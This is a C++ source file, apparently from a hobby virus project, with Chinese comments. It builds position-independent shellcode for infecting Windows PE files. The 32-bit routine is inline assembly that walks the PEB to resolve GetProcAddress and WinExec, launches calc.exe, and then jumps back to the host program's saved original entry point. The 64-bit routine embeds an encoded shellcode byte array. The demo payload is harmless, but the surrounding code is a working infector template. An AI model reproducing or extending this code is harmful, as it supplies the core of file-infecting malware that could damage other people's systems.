#include "pe.hpp"
#include "virus.hpp"
#include <Windows.h>
#include <deque>




// 32 位计算器 shellcode
std::string GetCalcuatorShellcode32(DWORD entry_point) {
	// 跳过不执行内联汇编
	goto end;
	__asm {
	start:
		call A;
	A:
		//寻找kernel32.dll的基地址
		xor ecx, ecx;
		mov eax, dword ptr fs : [ecx + 30h] ; //EAX = PEB
		mov eax, dword ptr[eax + 0Ch]; //EAX = PEB->Ldr
		mov esi, dword ptr[eax + 14h]; //ESI = PEB->Ldr.InMemOrder
		lods dword ptr[esi]; //EAX = Second module
		xchg eax, esi; //EAX = ESI, ESI = EAX
		lods dword ptr[esi]; //EAX = Third(kernel32)
		mov ebx, dword ptr[eax + 10h]; //EBX = Base address
		//查找kernel32.dll的导出表
		mov edx, dword ptr[ebx + 3Ch]; //EDX = DOS->e_lfanew
		add edx, ebx; //EDX = PE Header
		mov edx, dword ptr[edx + 78h]; //EDX = Offset export table
		add edx, ebx; //EDX = Export table
		mov esi, dword ptr[edx + 20h]; //ESI = Offset names table
		add esi, ebx; //ESI = Names table
		xor ecx, ecx; //EXC = 0
		// 在 AddressOfNames 数组中查找 GetProcAddress 函数
	Get_Function:
		inc ecx; //Increment the ordinal
		lods dword ptr[esi]; //Get name offset
		add eax, ebx; //Get function name
		// PteG
		cmp dword ptr[eax], 50746547h;
		jne Get_Function;
		// Acor
		cmp dword ptr[eax + 4], 41636F72h;
		jne Get_Function;
		// erdd
		cmp dword ptr[eax + 8], 65726464h;
		jne Get_Function;
		// FIXME
		// 这里不能够用10，那么怎么比较整个函数名称呢？
		// sser
		//cmp dword ptr[eax + 10], 73736572h;
		//jne Get_Function;
		// 根据下标(ecx)在 AddressOfNameOrdinals 找到对应的值
		mov esi, dword ptr[edx + 24h]; //ESI = Offset ordinals
		add esi, ebx; //ESI = Ordinals table
		// AddressOfNameOrdinals 是 WORD 数组
		mov cx, word ptr[esi + ecx * 2];
		dec ecx
			// AddressOfFunction 中寻找函数的 RVA
			mov esi, dword ptr[edx + 1Ch]; //ESI = Offset address table
		add esi, ebx; //ESI = Address table
		mov edx, dword ptr[esi + ecx * 4]; //EDX = Pointer(offset)
		add edx, ebx; //EDX = GetProcAddress
		push ebx; //PUSH kernel32.Base address
		push edx; //PUSH kernel32.GetProcAddress
		//寻找WinExec函数地址
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		// cex
		mov ecx, 00636578h;
		push ecx; //PUSH ECX
		// EniW
		push 456E6957h;
		push esp; //PUSH ESP WinExec
		push ebx; //PUSH EBX kernel32.Base address
		// 调用 GetProcAddress
		call edx;
		add esp, 8; //ESP + 8
		pop ecx; //ECX = 0
		push eax; //PUSH EAX-- > kernel32.WinExec Addresss
		//赋值命令行字符串
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		push 0x6578652E;
		push 0x636C6163; //calc.exe
		xor ebx, ebx; //EBX = 0
		mov ebx, esp; //EBX = "calc.exe"
		xor ecx, ecx;
		inc ecx;
		push ecx; //PUSH ECX = 1
		push ebx; //PUSH EBX = "calc.exe"
		// 调用 WinExec
		call eax;
		// 堆栈平衡
		// 该函数可能不会清空堆栈
		add esp, 10h;
		pop edx; //EDX = kernel32.GetProcAddress
		pop ebx; //EBX = kernel32.Base Address
		// 原来的入口点存在 shellcode 前 4 位，call 指令占据 5 个字节
		pop eax;
		// 回复栈顶指针
		add sp, 4;
		sub eax, 9;
		jmp [eax];
	};
end:
	CHAR* buffer;
	size_t len;

	__asm {
		push eax;
		push ebx;
		mov eax, start;
		mov buffer, eax;
		lea eax, end;
		lea ebx, start;
		sub eax, ebx;
		mov len, eax;
		pop ebx;
		pop eax;
	};
	std::string shellcode;
	// 存入旧的入口点
	for (int i = 0; i != sizeof(DWORD); i++) {
		shellcode.push_back(static_cast<CHAR>(entry_point >> (i * 8)));
	}
	for (size_t i = 0; i != len; i++) {
		shellcode.push_back(buffer[i]);
	}
	return shellcode;
}

std::string GetCalcuatorShellcode64(DWORD entry_point) {
	unsigned char buf[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\xbd\xdb\xf4\x4d\xb9\x1f\x6b\x9a\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x41\x93\x77\xa9\x49\xf7"
		"\xab\x9a\xbd\xdb\xb5\x1c\xf8\x4f\x39\xcb\xeb\x93\xc5\x9f\xdc"
		"\x57\xe0\xc8\xdd\x93\x7f\x1f\xa1\x57\xe0\xc8\x9d\x93\x7f\x3f"
		"\xe9\x57\x64\x2d\xf7\x91\xb9\x7c\x70\x57\x5a\x5a\x11\xe7\x95"
		"\x31\xbb\x33\x4b\xdb\x7c\x12\xf9\x0c\xb8\xde\x89\x77\xef\x9a"
		"\xa5\x05\x32\x4d\x4b\x11\xff\xe7\xbc\x4c\x69\x94\xeb\x12\xbd"
		"\xdb\xf4\x05\x3c\xdf\x1f\xfd\xf5\xda\x24\x1d\x32\x57\x73\xde"
		"\x36\x9b\xd4\x04\xb8\xcf\x88\xcc\xf5\x24\x3d\x0c\x32\x2b\xe3"
		"\xd2\xbc\x0d\xb9\x7c\x70\x57\x5a\x5a\x11\x9a\x35\x84\xb4\x5e"
		"\x6a\x5b\x85\x3b\x81\xbc\xf5\x1c\x27\xbe\xb5\x9e\xcd\x9c\xcc"
		"\xc7\x33\xde\x36\x9b\xd0\x04\xb8\xcf\x0d\xdb\x36\xd7\xbc\x09"
		"\x32\x5f\x77\xd3\xbc\x0b\xb5\xc6\xbd\x97\x23\x9b\x6d\x9a\xac"
		"\x0c\xe1\x41\x32\xc0\xfc\x83\xb5\x14\xf8\x45\x23\x19\x51\xfb"
		"\xb5\x1f\x46\xff\x33\xdb\xe4\x81\xbc\xc6\xab\xf6\x3c\x65\x42"
		"\x24\xa9\x05\x03\x1e\x6b\x9a\xbd\xdb\xf4\x4d\xb9\x57\xe6\x17"
		"\xbc\xda\xf4\x4d\xf8\xa5\x5a\x11\xd2\x5c\x0b\x98\x02\xff\x76"
		"\xb0\xb7\x9a\x4e\xeb\x2c\xa2\xf6\x65\x68\x93\x77\x89\x91\x23"
		"\x6d\xe6\xb7\x5b\x0f\xad\xcc\x1a\xd0\xdd\xae\xa9\x9b\x27\xb9"
		"\x46\x2a\x13\x67\x24\x21\x2e\xd8\x73\x08\xb4\xd8\xa3\x91\x4d"
		"\xb9\x1f\x6b\x9a";

	// 跳过不执行内联汇编
	goto end;
	__asm {
	start:
		call A;
	A:
		// 堆栈平衡
		// 该函数可能不会清空堆栈
		add esp, 10h;
		pop edx; //EDX = kernel32.GetProcAddress
		pop ebx; //EBX = kernel32.Base Address
		// 原来的入口点存在 shellcode 前 4 位，call 指令占据 5 个字节
		pop eax;
		// 回复栈顶指针
		add sp, 4;
		sub eax, 9;
		jmp[eax];
	};
end:
	//CHAR* buffer;
	//size_t len;
	/*
	__asm {
		push eax;
		push ebx;
		mov eax, start;
		mov buffer, eax;
		lea eax, end;
		lea ebx, start;
		sub eax, ebx;
		mov len, eax;
		pop ebx;
		pop eax;
	};*/
	std::string shellcode;
	// 存入旧的入口点
	//for (int i = 0; i != sizeof(ULONGLONG); i++) {
	//	shellcode.push_back(static_cast<CHAR>(entry_point >> (i * 8)));
	//}
	for (size_t i = 0; i < 320; i++) {
		shellcode.push_back(buf[i]);
	}
	return shellcode;
}